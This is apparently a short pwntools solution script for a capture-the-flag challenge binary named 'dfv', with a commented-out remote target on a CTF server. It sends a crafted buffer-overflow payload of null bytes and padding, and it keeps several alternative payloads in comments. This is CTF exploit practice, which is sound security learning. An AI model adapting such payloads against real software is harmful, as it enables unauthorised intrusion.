from pwn import *

context.terminal = ['gnome-terminal','--window','-e']
context.log_level = 'DEBUG'
#for local
sh = gdb.debug("./dfv")
#for remote
#sh = remote("pwn.ctf.b01lers.com",1001)
#payload = cyclic(30)
#payload = p64(0x0a5641444c4f4f43)
#payload = b'\x43\x4f\x4f\x4c\x44\x41\x56'
payload = b'\x00'*8+b'a'*16
sh.sendlineafter(">",payload)
print(sh.recvline())
